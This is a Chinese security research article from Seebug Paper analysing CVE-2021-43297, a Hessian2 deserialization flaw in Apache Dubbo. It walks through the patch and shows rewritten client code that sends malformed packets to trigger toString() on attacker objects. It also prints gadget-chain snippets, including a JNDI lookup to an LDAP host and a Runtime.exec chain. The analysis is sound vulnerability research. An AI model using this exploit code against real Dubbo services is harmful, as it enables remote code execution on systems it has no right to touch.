**作者：Longofo@知道创宇404实验室**  
**日期：2022年1月18日**

上周看到Apache官方又发布了一个[Apache Dubbo
Hessian2的漏洞](https://lists.apache.org/thread/1mszxrvp90y01xob56yp002939c7hlww)，来看看这个描述：

![](https://images.seebug.org/content/images/2022/01/e95a9d64-27ff-40d9-8809-53b0c775011d.png-w331s)

之前有段时间Dubbo的反序列化已经被蹂躏过n次了，而这个解析错误时看起来总有那么点不一样，想想这个漏洞即使比较鸡肋，也必然它值得借鉴的地方。下面来看看这个漏洞，以及Hessian比较处理时比较有意思的地方。

距离之前Dubbo的漏洞也有一段时间了，现在也差不多快忘了，好在之前写过一篇[Dubbo的分析](https://paper.seebug.org/1131/)，温故一下也能回忆起来。

## 补丁分析

这个漏洞修复的不是Apache Dubbo，修复的地方在[hessian-lite](https://github.com/apache/dubbo-hessian-lite/commit/a35a4e59ebc76721d936df3c01e1943e871729bd#)：

![](https://images.seebug.org/content/images/2022/01/991d9e34-5eca-4433-8adb-2ac3eb00a1ab.png-w331s)

![](https://images.seebug.org/content/images/2022/01/a658276f-f12e-4d98-8dc8-6df4278782b4.png-w331s)

注意这个 **commit：Remove toString calling**
，看修复的几个类，都是在抛异常中删除对象的拼接，这里存在字符串拼接的隐式`.toString`调用。

最后还有一个DENY_CLASS禁用了某些包前缀，大概就是触发toString调用链的某些部分。

## 漏洞环境

  * Apache Dubbo 2.7.14
  * JDK8u102

  * demo拉取官方的[dubbo-samples-basic](https://github.com/apache/dubbo-samples/tree/master/dubbo-samples-basic)

## 漏洞分析

### Abstract Deserializer

看上面补丁，有这样几个类：AbstractDeserializer、AbstractListDeserializer、AbstractMapDeserializer，它们修复之前的代码也出奇的一致：

    
    
    @Override
        public Object readObject(AbstractHessianInput in)
                throws IOException {
            Object obj = in.readObject();
            String className = getClass().getName();
    
            if (obj != null)
                throw error(className + ": unexpected object " + obj.getClass().getName() + " (" + obj + ")");
            else
                throw error(className + ": unexpected null value");
        }

这怎么看都不对劲，输入流读出对象，对象不为空抛异常！！！这没有上下文看起来多少带点大病。抽象类不能被实例化，看看有没有子类没有重写这个方法，如果没有重写或重写并调用了父类这个方法，那么就能触发`.toString()`的调用了。

找了一圈，这三个抽象类的所有子类，都重写了这个方法，并且都不会调用父类地方法，那么这里的修复猜测可能是用户会继承这个类然后没有重写的可能，就不考虑这种情况了。

### Hessian2Input

#### 通往obj.toString()

补丁中还有`com.alibaba.com.caucho.hessian.io.Hessian2Input.java`的修复，这类名怎么看都是修复在大动脉上：

![](https://images.seebug.org/content/images/2022/01/c95a1e28-3f15-43f7-9af4-52cb26190ffd.png-w331s)

`.expect()`中有个读取readObject()的操作，接着就是`obj.toString`的调用，`.expect()`在Hessian2Input类中有多处使用。

如何确定官方提供的dubbo-samples-basic使用的Hessian2，搜索Hessian2Input关键词的类，有Hessian2Input和Hessian2ObjectInput，猜测一下在大概率会被调用的函数上打上断点，如果不确定可以尝试在这两个类所有函数上打上断点。

经过测试，最先被调用的是`com.alibaba.com.caucho.hessian.io.Hessian2Input#readString()`

调用栈如下：

    
    
    readString:1611, Hessian2Input (com.alibaba.com.caucho.hessian.io)
    readUTF:90, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
    decode:111, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
    decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
    decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
    received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
    run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
    runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
    run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
    run:745, Thread (java.lang)

在`com.alibaba.com.caucho.hessian.io.Hessian2Input#readString()`中就有`.expect(）`的调用，这不巧了吗（并不，一开始并没有在readString()上下断，更令人关注的难道不是readObject()吗，但是有时候你不关注的反而更奇妙），因为刚好在上两层栈，就是整个Dubbo
rpc调用处理的decode函数：

![](https://images.seebug.org/content/images/2022/01/19b832b4-476c-443f-abf2-453252e99c8b.png-w331s)

得到Hessian2InputObject，调用readUTF获取版本号，这里是Hessian2反序列化的开始。接下来就是如何在readString()中调用到`.expect()`了，然后触发`expect()`中的readObject()。

看下`readString()`处理：

    
    
    public String readString() throws IOException {
            int tag = this.read();
            int ch;
            switch(tag) {
            case 0:
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
            case 6:
            case 7:
            case 8:
            case 9:
            case 10:
            case 11:
            case 12:
            case 13:
            case 14:
            case 15:
            case 16:
            case 17:
            case 18:
            case 19:
            case 20:
            case 21:
            case 22:
            case 23:
            case 24:
            case 25:
            case 26:
            case 27:
            case 28:
            case 29:
            case 30:
            case 31:
                this._isLastChunk = true;
                this._chunkLength = tag - 0;
                this._sbuf.setLength(0);
    
                while((ch = this.parseChar()) >= 0) {
                    this._sbuf.append((char)ch);
                }
    
                return this._sbuf.toString();
            case 32:
            case 33:
            ...
            case 67:
            ...
            case 127:
            default:
                throw this.expect("string", tag);
            case 48:
            case 49:
            case 50:
            ...
            ...省略
            case 253:
            case 254:
            case 255:
                return String.valueOf((tag - 248 << 8) + this.read());
            }
        }

一共256个case，从`.read()`中读取tag：

    
    
    public final int read() throws IOException {
            return this._length <= this._offset && !this.readBuffer() ? -1 : this._buffer[this._offset++] & 255;
        }

一开始我被switch的写法坑了，我以为default条件是在所有找不到的情况下才会调用，而`this._buffer[this._offset++] &
255`的范围只能为0-255，这根本到不了default里面啊，那只能寄希望于`this._length <= this._offset &&
!this.readBuffer()`返回-1了。可是折腾了半天，这里就不可能返回-1...

后来恍悟switch是按从上到下处理的，那么只需要取default上面没有条件的case就行了，这里后面取了67，这里取值67很巧，后面会看到。

#### 畸形数据包构造=>代码调用

从上面可以看出，我们要到达`obj.toString()`，就要构造畸形数据包改变正常流向。一开始抓包看了下，发送的包还挺多的，这要构造起来不得把dubbo翻一遍。后来想想，服务端既然用Hessian2Input处理的数据，那么客户端可能就是用Hessian2Output处理的，经过一些测试，我重写了Apache
Dubbo部分代码改变Hessian2Input.readString()走向，以及能成功的在expect方法中readObject。

重写`com.alibaba.com.caucho.hessian.io.Hessian2Output#writeString(java.lang.String)`:

    
    
    public void writeString(String value) throws IOException {
            int offset = this._offset;
            byte[] buffer = this._buffer;
            if (4096 <= offset + 16) {
                this.flush();
                offset = this._offset;
            }
    
            if (value == null) {
                buffer[offset++] = 78;
                this._offset = offset;
            } else {
                int length = value.length();
    
                int strOffset;
                int sublen;
                for (strOffset = 0; length > 32768; strOffset += sublen) {
                    sublen = 32768;
                    offset = this._offset;
                    if (4096 <= offset + 16) {
                        this.flush();
                        offset = this._offset;
                    }
    
                    char tail = value.charAt(strOffset + sublen - 1);
                    if ('\ud800' <= tail && tail <= '\udbff') {
                        --sublen;
                    }
    
                    buffer[offset + 0] = 82;
                    buffer[offset + 1] = (byte) (sublen >> 8);
                    buffer[offset + 2] = (byte) sublen;
                    this._offset = offset + 3;
                    this.printString(value, strOffset, sublen);
                    length -= sublen;
                }
    
                offset = this._offset;
                if (4096 <= offset + 16) {
                    this.flush();
                    offset = this._offset;
                }
    
                if (length <= 31) {
                    if (value.startsWith("2.")) {//这里只让写入version版本的时候使服务端readString异常，走向expect
                        buffer[offset++] = 67;//取值67
                    } else {
                        buffer[offset++] = (byte) (0 + length);
                    }
                } else if (length <= 1023) {
                    buffer[offset++] = (byte) (48 + (length >> 8));
                    buffer[offset++] = (byte) length;
                } else {
                    buffer[offset++] = 83;
                    buffer[offset++] = (byte) (length >> 8);
                    buffer[offset++] = (byte) length;
                }
    
                if (!value.startsWith("2.")) {
                    this._offset = offset;
                    this.printString(value, strOffset, length);
                }
            }
        }

重写`org.apache.dubbo.rpc.protocol.dubbo.DubboCodec#encodeRequestData(org.apache.dubbo.remoting.Channel,
org.apache.dubbo.common.serialize.ObjectOutput, java.lang.Object,
java.lang.String)`:

    
    
    protected void encodeRequestData(Channel channel, ObjectOutput out, Object data, String version) throws IOException {
            RpcInvocation inv = (RpcInvocation) data;
            out.writeUTF(version);
            out.writeObject(Test.getObject());//写入恶意对象，在expect中readObject的对象
        }

重写`org.apache.dubbo.registry.zookeeper.ZookeeperRegistry#doSubscribe`：

    
    
    public void doSubscribe(final URL url, final NotifyListener listener) {
            try {
                String path;
                if ("*".equals(url.getServiceInterface())) {
                    String root = this.toRootPath();
                    ConcurrentMap<NotifyListener, ChildListener> listeners = (ConcurrentMap) this.zkListeners.computeIfAbsent(url, (k) -> {
                        return new ConcurrentHashMap();
                    });
                    ChildListener zkListener = (ChildListener) listeners.computeIfAbsent(listener, (k) -> {
                        return (parentPath, currentChilds) -> {
                            Iterator var5 = currentChilds.iterator();
    
                            while (var5.hasNext()) {
                                String child = (String) var5.next();
                                child = URL.decode(child);
                                if (!this.anyServices.contains(child)) {
                                    this.anyServices.add(child);
                                    this.subscribe(url.setPath(child).addParameters(new String[]{"interface", child, "check", String.valueOf(false)}), k);
                                }
                            }
    
                        };
                    });
                    this.zkClient.create(root, false);
                    List<String> services = this.zkClient.addChildListener(root, zkListener);
                    if (CollectionUtils.isNotEmpty(services)) {
                        Iterator var7 = services.iterator();
    
                        while (var7.hasNext()) {
                            path = (String) var7.next();
                            path = URL.decode(path);
                            this.anyServices.add(path);
                            this.subscribe(url.setPath(path).addParameters(new String[]{"interface", path, "check", String.valueOf(false)}), listener);
                        }
                    }
                } else {
                    CountDownLatch latch = new CountDownLatch(1);
                    List<URL> urls = new ArrayList();
                    String[] var15 = this.toCategoriesPath(url);
                    int var16 = var15.length;
    
                    for (int var17 = 0; var17 < var16; ++var17) {
                        path = var15[var17];
                        ConcurrentMap<NotifyListener, ChildListener> listeners = (ConcurrentMap) this.zkListeners.computeIfAbsent(url, (k) -> {
                            return new ConcurrentHashMap();
                        });
                        ChildListener zkListener = (ChildListener) listeners.computeIfAbsent(listener, (k) -> {
                            return new ZookeeperRegistry.RegistryChildListenerImpl(url, k, latch);
                        });
                        if (zkListener instanceof ZookeeperRegistry.RegistryChildListenerImpl) {
                            ((ZookeeperRegistry.RegistryChildListenerImpl) zkListener).setLatch(latch);
                        }
    
                        this.zkClient.create(path, false);
                        List<String> children = this.zkClient.addChildListener(path, zkListener);
                        if (children != null) {
                            urls.addAll(this.toUrlsWithEmpty(url, path, children));
                        }
                    }
    
                    URL url1 = URL.valueOf(String.format("dubbo://%s:%s/%s?anyhost=true&application=demo-provider&default=true&deprecated=false&dubbo=2.0.2&dynamic=true&generic=false&interface=%s&metadata-type=remote&methods=ccc,ddd&pid=111&release=2.7.14&service.name=ServiceBean:/111.222&side=provider&timestamp=111&token=aaa", BasicConsumer.targetHost, BasicConsumer.targetPort, BasicConsumer.anyInterface, BasicConsumer.anyInterface));//重写了这里，因为我们不知道目标的接口，zoomkeeper与目标服务通信之后，不会返回目标的ip和端口，所以这里的前提就是如果你不知道目标暴露的接口服务，那么需要知道目标服务的ip和port
    
                    urls.set(0, url1);
    
                    this.notify(url, listener, urls);
                    latch.countDown();
                }
    
            } catch (Throwable var12) {
                throw new RpcException("Failed to subscribe " + url + " to zookeeper " + this.getUrl() + ", cause: " + var12.getMessage(), var12);
            }
        }

重写`com.alibaba.com.caucho.hessian.io.SerializerFactory#getDefaultSerializer`：

    
    
    protected Serializer getDefaultSerializer(Class cl) {
            this._isAllowNonSerializable = true;//默认是不允许序列化没有继承Serializable的类，但是神奇的是这只是本地的校验，关闭即可，服务端根本没有校验类需要继承Serializable
            if (this._defaultSerializer != null) {
                return this._defaultSerializer;
            } else if (!Serializable.class.isAssignableFrom(cl) && !this._isAllowNonSerializable) {
                throw new IllegalStateException("Serialized class " + cl.getName() + " must implement java.io.Serializable");
            } else {
                return new JavaSerializer(cl, this._loader);
            }
        }

以上的demo代码放到[github](https://github.com/longofo/Apache-Dubbo-Hessian2-CVE-2021-43297)了，有兴趣的可以测试下。

#### toString调用链构造注意事项

在marshalsec工具中，提供了对于Hessian反序列化可利用的几条链：

  * Rome
  * XBean
  * Resin
  * SpringPartiallyComparableAdvisorHolder
  * SpringAbstractBeanFactoryPointcutAdvisor

不过有的链被拉到了黑名单了，或者需要一些三方包。

之前看到过jdk中其实有个toString的利用链：

    
    
    javax.swing.MultiUIDefaults.toString
                UIDefaults.get
                    UIDefaults.getFromHashTable
                        UIDefaults$LazyValue.createValue
                        SwingLazyValue.createValue
                            javax.naming.InitialContext.doLookup()
    
    
    UIDefaults uiDefaults = new UIDefaults();
    uiDefaults.put("aaa", new SwingLazyValue("javax.naming.InitialContext", "doLookup", new Object[]{"ldap://127.0.0.1:6666"}));
    Class<?> aClass = Class.forName("javax.swing.MultiUIDefaults");
    Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(UIDefaults[].class);
    declaredConstructor.setAccessible(true);
    o = declaredConstructor.newInstance(new Object[]{new UIDefaults[]{uiDefaults}});

经过测试，发现没法使用：

  * javax.swing.MultiUIDefaults是peotect类，只能在javax.swing.中使用，而且Hessian2拿到了构造器，但是没有setAccessable，newInstance就没有权限
  * 所以要找链的话需要类是public的，构造器也是public的，构造器的参数个数不要紧，hessian2会自动挨个测试构造器直到成功

然后对于存在Map类型的利用链，例如ysoserial中的cc5部分：

    
    
    TiedMapEntry.toString()
        LazyMap.get()
            ChainedTransformer.transform()
                ConstantTransformer.transform()
                InvokerTransformer.transform()
                    Method.invoke()
                        Class.getMethod()
                InvokerTransformer.transform()
                    Method.invoke()
                        Runtime.getRuntime()
                InvokerTransformer.transform()
                    Method.invoke()
                        Runtime.exec()

这个也是无法利用的，因为Hessian2在恢复map类型的对象时，硬编码成了HashMap或者TreeMap，这里LazeMap就断了。

扫了下basic项目自带的包，没找到能用的链，三方包中找到利用链的可能性比较大一些。

### 利用条件

对于上面这个basic项目，使用zoomkeeper作为注册中心，要利用需要的条件如下：

  * 知道目标服务的ip&port，不需要知道zoomkeeper注册中心的地址，上面测试项目中使用的是这种样例，可以看到在客户端代码中，我没有用服务端提供的接口而是随便写的一个，依然可以成功利用
  * 或者需要知道zoomkeeper的ip&port+一个目标的interface接口名称（因为先和zoomkeeper通信，如果没有提供正确的接口名称，他不会返回目标的ip和port信息，如果你知道目标的一个interface接口，那么就可以借助zoomkeeper拿到目标的ip和port，总之和zoomkeeper通信的目的也是拿到目标的ip和port）

  * 一个toString利用链

## 最后

从这个漏洞可以学到以下两点：

  * 类似Hessian2这种反序列化组件，如果要发现类似的漏洞，可以把他们的核心处理类比如Hessian2的Hessian2Input的所有readXXX方法作为source
  * 畸形数据有时候构造不容易，可以考虑从客户端代码转换

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1814/>

